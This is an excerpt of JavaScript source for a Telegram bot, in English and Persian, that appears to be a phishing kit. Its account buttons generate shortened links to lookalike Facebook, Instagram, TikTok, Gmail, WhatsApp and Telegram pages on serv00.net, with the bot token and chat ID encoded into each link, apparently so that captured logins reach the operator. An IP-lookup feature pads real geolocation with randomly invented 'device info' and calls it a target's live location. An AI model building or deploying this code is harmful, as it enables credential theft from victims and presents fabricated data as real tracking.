...
const messages = {
  en: {
    ...
    ipAddressMessage: 
      `you can easily track and find all information of an ip address and others\n` +
      `/ip       - [Get information about IP]\n` +
      `/host     - [Get information about host]\n` +
      `/whois    - [Get WHOIS]\n\n` +
      `Use this method to get information about IP:\n` +
      `/ip {yourip}\n\n` +
      `e.g: /ip xxx.xxx.xxx.xxx`,
    ipAddressResult: (data, deviceInfo) =>
      `╭┈┈┈┈┈┈┈┈┈┈┈┈┈╮\n` +
      ...
      `⚡ Charging Status: ${deviceInfo.charging}\n` +
      `🗣️ Browser Language: ${deviceInfo.language}\n` +
      `📏 Screen Size: ${deviceInfo.screenSize}\n` +
      `🚀 Internet Speed: ${deviceInfo.internetSpeed} Mbps\n` +
      `🌍 Network Type: ${deviceInfo.networkType}\n` +
      `✅ Mobile Data: ${deviceInfo.mobileData}\n` +
      `🧠 Total RAM: ${deviceInfo.ram} GB\n` +
      `💾 Device Storage: ${deviceInfo.storage}\n` +
      `🕒 Date: ${deviceInfo.date}\n` +
      `🗺 Target Exact Live Location: ${data.loc ? `https://www.google.com/maps?q=${data.loc}` : 'Unknown'}`,
    ipAddressError: 'Error: That IP address or hostname is fucked up. Try again, asshole.',
    accountMessage: (url) => `*Hi* my dear best friends this is your account link\n${url}`,
    accountButtons: {
      facebook: 'Facebook',
      instagram: 'Instagram',
      tiktok: 'TikTok',
    ...
    facebookMessage: (url) => `*Hi* this is your fucking Facebook link\n${url}`,
    instagramMessage: (url) => `*Hi* this is your shitty Instagram link\n${url}`,
    tiktokMessage: (url) => `*Hi* this is your damn TikTok link\n${url}`,
    gmailMessage: (url) => `*Hi* this is your bloody Gmail link\n${url}`,
    whatsappMessage: (url) => `*Hi* this is your crap WhatsApp link\n${url}`,
    telegramMessage: (url) => `*Hi* this is your fucking Telegram link\n${url}`,
  ...
  fa: {
    ...
    ipAddressMessage: 
      `شما می‌توانید به راحتی اطلاعات یک آدرس IP یا هاست را ردیابی کنید\n` +
      `/ip       - [دریافت اطلاعات IP]\n` +
      `/host     - [دریافت اطلاعات هاست]\n` +
      `/whois    - [دریافت WHOIS]\n\n` +
      `برای دریافت اطلاعات IP از این روش استفاده کنید:\n` +
      `/ip {آدرس IP}\n\n` +
      `مثال: /ip xxx.xxx.xxx.xxx`,
    ipAddressResult: (data, deviceInfo) =>
      `╭┈┈┈┈┈┈┈┈┈┈┈┈┈╮\n` +
      `⚡Powered by :- @KaIi_Linux_BOT\n` +
      `╰┈┈┈┈┈┈┈┈┈┈┈┈┈╯\n\n` +
      `🌐 آدرس IP: ${data.ip || 'نامشخص'}\n` +
      `💻 عامل کاربر: ${deviceInfo.userAgent}\n` +
      `🔋 درصد باتری: ${deviceInfo.battery}%\n` +
      `⚡ وضعیت شارژ: ${deviceInfo.charging}\n` +
      `🗣️ زبان مرورگر: ${deviceInfo.language}\n` +
      `📏 اندازه صفحه: ${deviceInfo.screenSize}\n` +
      `🚀 سرعت اینترنت: ${deviceInfo.internetSpeed} مگابیت بر ثانیه\n` +
      `🌍 نوع شبکه: ${deviceInfo.networkType}\n` +
      `✅ داده موبایل: ${deviceInfo.mobileData}\n` +
      `🧠 رم کل: ${deviceInfo.ram} گیگابایت\n` +
      `💾 فضای ذخیره‌سازی: ${deviceInfo.storage}\n` +
      `🕒 تاریخ: ${deviceInfo.date}\n` +
      `🗺 موقعیت دقیق هدف: ${data.loc ? `https://www.google.com/maps?q=${data.loc}` : 'نامشخص'}`,
    ipAddressError: 'خطا: این آدرس IP یا هاست خراب است. دوباره امتحان کن، احمق.',
    accountMessage: (url) => `*سلام* دوستان عزیزم این لینک حساب شماست\n${url}`,
    accountButtons: {
      facebook: 'فیسبوک',
    ...
    facebookMessage: (url) => `*سلام* این لینک کثیف فیسبوک شماست\n${url}`,
    instagramMessage: (url) => `*سلام* این لینک مزخرف اینستاگرام شماست\n${url}`,
    tiktokMessage: (url) => `*سلام* این لینک لعنتی تیک‌تاک شماست\n${url}`,
    gmailMessage: (url) => `*سلام* این لینک خونین جیمیل شماست\n${url}`,
    whatsappMessage: (url) => `*سلام* این لینک گند واتساپ شماست\n${url}`,
    telegramMessage: (url) => `*سلام* این لینک کثیف تلگرام شماست\n${url}`,
  ...
  reply_markup: {
    keyboard: [
      ...
      [
        ...
        { text: messages[lang].menu.ipAddress },
      ],
      [
        { text: messages[lang].menu.account },
...
const accountButtonsKeyboard = (lang) => ({
  reply_markup: {
    inline_keyboard: [
      [
        { text: messages[lang].accountButtons.facebook, callback_data: 'account_facebook' },
        { text: messages[lang].accountButtons.instagram, callback_data: 'account_instagram' },
      ],
      [
        { text: messages[lang].accountButtons.tiktok, callback_data: 'account_tiktok' },
        { text: messages[lang].accountButtons.gmail, callback_data: 'account_gmail' },
      ],
      [
        { text: messages[lang].accountButtons.whatsapp, callback_data: 'account_whatsapp' },
        { text: messages[lang].accountButtons.telegram, callback_data: 'account_telegram' },
      ],
    ],
  },
});
...
const fetchIpInfo = async (ipOrHost) => {
  try {
    const response = await axios.get(`http://ip-api.com/json/${ipOrHost}?fields=66846719`);
...
const mockDeviceInfo = (lang) => {
  const userAgents = [
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
  ];
  const screenSizes = ['360x740', '1920x1080', '375x812'];
  const networkTypes = ['3g', '4g', 'wifi'];
  const languages = lang === 'fa' ? ['fa-IR'] : ['en-US', 'fa-IR', 'es-ES'];
  const battery = Math.floor(Math.random() * 100) + 1;
  const charging = Math.random() > 0.5 ? 'Charging' : 'Not Charging';
  const internetSpeed = (Math.random() * 10).toFixed(2);
  const mobileData = Math.random() > 0.5 ? 'Yes' : 'No';
  const ram = Math.floor(Math.random() * 8) + 1;
  const storageUsed = (Math.random() * 10).toFixed(2);
  const storageTotal = (Math.random() * 50 + 10).toFixed(2);
  ...
  return {
    ...
    mobileData,
    ram,
    storage: `${storageUsed} GB used / ${storageTotal} GB total`,
    date,
  };
};
...
module.exports = async (req, res) => {
  try {
    ...
    if (update.message) {
      ...
      if (text?.startsWith('/start')) {
      ...
      else if (text === messages[lang].menu.ipAddress) {
        await bot.telegram.sendPhoto(
          chatId,
          'https://i.ibb.co/MM1w5VJ/775a542a8c19.jpg',
          {
            caption: messages[lang].ipAddressMessage,
            reply_markup: mainMenuKeyboard(lang).reply_markup,
          }
        );
      }
        ...
        const ipOrHost = text.split(' ')[1];
        if (!ipOrHost) {
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].ipAddressError,
            mainMenuKeyboard(lang)
          );
          return;
        }
        ...
        const ipInfo = await fetchIpInfo(ipOrHost);
        if (!ipInfo) {
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].ipAddressError,
        ...
        const deviceInfo = mockDeviceInfo(lang);
        await bot.telegram.sendMessage(
          chatId,
          messages[lang].ipAddressResult(ipInfo, deviceInfo),
          mainMenuKeyboard(lang)
        );
      }
        ...
        const ipInfo = await fetchIpInfo(domain);
        const deviceInfo = mockDeviceInfo(lang);
        await bot.telegram.sendMessage(
          chatId,
          messages[lang].ipAddressResult(ipInfo || { ip: domain, loc: null }, deviceInfo),
          mainMenuKeyboard(lang)
        );
      }

      else if (text === messages[lang].menu.account) {
        try {
          const randomLetter = String.fromCharCode(97 + Math.floor(Math.random() * 26));
          const randomNumber = Math.floor(Math.random() * 10);
          const noise = `${randomLetter}${randomNumber}`;
          const encodedBot = Buffer.from(botToken).toString('base64') + noise;
          const encodedId = Buffer.from(chatId.toString()).toString('base64') + noise;
          const longUrl = `https://for-free.serv00.net/account/index.html?x=${encodedBot}&y=${encodedId}`;
          const shortUrl = await shortenUrl(longUrl);
          await bot.telegram.sendPhoto(
            chatId,
            'https://mallucampaign.in/images/img_1709042709.jpg',
            {
              caption: messages[lang].accountMessage(shortUrl),
              parse_mode: 'Markdown',
              reply_markup: accountButtonsKeyboard(lang).reply_markup,
            }
          );
        } catch (error) {
          console.error('Error in Account button:', error);
          await bot.telegram.sendMessage(chatId, messages[lang].error);
        }
      }
    ...
    if (update.callback_query) {
      ...
      else if (callbackData === 'account_facebook') {
        try {
          const randomLetter = String.fromCharCode(97 + Math.floor(Math.random() * 26));
          const randomNumber = Math.floor(Math.random() * 10);
          const noise = `${randomLetter}${randomNumber}`;
          const encodedBot = Buffer.from(botToken).toString('base64') + noise;
          const encodedId = Buffer.from(chatId.toString()).toString('base64') + noise;
          const longUrl = `https://for-free.serv00.net/facebook/index.html?x=${encodedBot}&y=${encodedId}`;
          const shortUrl = await shortenUrl(longUrl);
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].facebookMessage(shortUrl),
            {
              parse_mode: 'Markdown',
              reply_markup: mainMenuKeyboard(lang).reply_markup,
            }
          ...
          console.error('Error in Facebook button:', error);
          await bot.telegram.sendMessage(chatId, messages[lang].error);
        }
      }

      else if (callbackData === 'account_instagram') {
        try {
          const randomLetter = String.fromCharCode(97 + Math.floor(Math.random() * 26));
          const randomNumber = Math.floor(Math.random() * 10);
          const noise = `${randomLetter}${randomNumber}`;
          const encodedBot = Buffer.from(botToken).toString('base64') + noise;
          const encodedId = Buffer.from(chatId.toString()).toString('base64') + noise;
          const longUrl = `https://for-free.serv00.net/instagram/index.html?x=${encodedBot}&y=${encodedId}`;
          const shortUrl = await shortenUrl(longUrl);
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].instagramMessage(shortUrl),
            {
              parse_mode: 'Markdown',
              reply_markup: mainMenuKeyboard(lang).reply_markup,
            }
          ...
          console.error('Error in Instagram button:', error);
          await bot.telegram.sendMessage(chatId, messages[lang].error);
        }
      }

      else if (callbackData === 'account_tiktok') {
        try {
          const randomLetter = String.fromCharCode(97 + Math.floor(Math.random() * 26));
          const randomNumber = Math.floor(Math.random() * 10);
          const noise = `${randomLetter}${randomNumber}`;
          const encodedBot = Buffer.from(botToken).toString('base64') + noise;
          const encodedId = Buffer.from(chatId.toString()).toString('base64') + noise;
          const longUrl = `https://for-free.serv00.net/tiktok/index.html?x=${encodedBot}&y=${encodedId}`;
          const shortUrl = await shortenUrl(longUrl);
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].tiktokMessage(shortUrl),
            {
              parse_mode: 'Markdown',
              reply_markup: mainMenuKeyboard(lang).reply_markup,
            }
          ...
          console.error('Error in TikTok button:', error);
          await bot.telegram.sendMessage(chatId, messages[lang].error);
        }
      }

      else if (callbackData === 'account_gmail') {
        try {
          const randomLetter = String.fromCharCode(97 + Math.floor(Math.random() * 26));
          const randomNumber = Math.floor(Math.random() * 10);
          const noise = `${randomLetter}${randomNumber}`;
          const encodedBot = Buffer.from(botToken).toString('base64') + noise;
          const encodedId = Buffer.from(chatId.toString()).toString('base64') + noise;
          const longUrl = `https://for-free.serv00.net/gmail/index.html?x=${encodedBot}&y=${encodedId}`;
          const shortUrl = await shortenUrl(longUrl);
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].gmailMessage(shortUrl),
            {
              parse_mode: 'Markdown',
              reply_markup: mainMenuKeyboard(lang).reply_markup,
            }
          ...
          console.error('Error in Gmail button:', error);
          await bot.telegram.sendMessage(chatId, messages[lang].error);
        }
      }

      else if (callbackData === 'account_whatsapp') {
        try {
          const randomLetter = String.fromCharCode(97 + Math.floor(Math.random() * 26));
          const randomNumber = Math.floor(Math.random() * 10);
          const noise = `${randomLetter}${randomNumber}`;
          const encodedBot = Buffer.from(botToken).toString('base64') + noise;
          const encodedId = Buffer.from(chatId.toString()).toString('base64') + noise;
          const longUrl = `https://for-free.serv00.net/whatsapp/index.html?x=${encodedBot}&y=${encodedId}`;
          const shortUrl = await shortenUrl(longUrl);
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].whatsappMessage(shortUrl),
            {
              parse_mode: 'Markdown',
              reply_markup: mainMenuKeyboard(lang).reply_markup,
            }
          ...
          console.error('Error in WhatsApp button:', error);
          await bot.telegram.sendMessage(chatId, messages[lang].error);
        }
      }

      else if (callbackData === 'account_telegram') {
        try {
          const randomLetter = String.fromCharCode(97 + Math.floor(Math.random() * 26));
          const randomNumber = Math.floor(Math.random() * 10);
          const noise = `${randomLetter}${randomNumber}`;
          const encodedBot = Buffer.from(botToken).toString('base64') + noise;
          const encodedId = Buffer.from(chatId.toString()).toString('base64') + noise;
          const longUrl = `https://for-free.serv00.net/telegram/index.html?x=${encodedBot}&y=${encodedId}`;
          const shortUrl = await shortenUrl(longUrl);
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].telegramMessage(shortUrl),
            {
              parse_mode: 'Markdown',
              reply_markup: mainMenuKeyboard(lang).reply_markup,
            }
          ...
          console.error('Error in Telegram button:', error);
          await bot.telegram.sendMessage(chatId, messages[lang].error);
        }
      }
    }
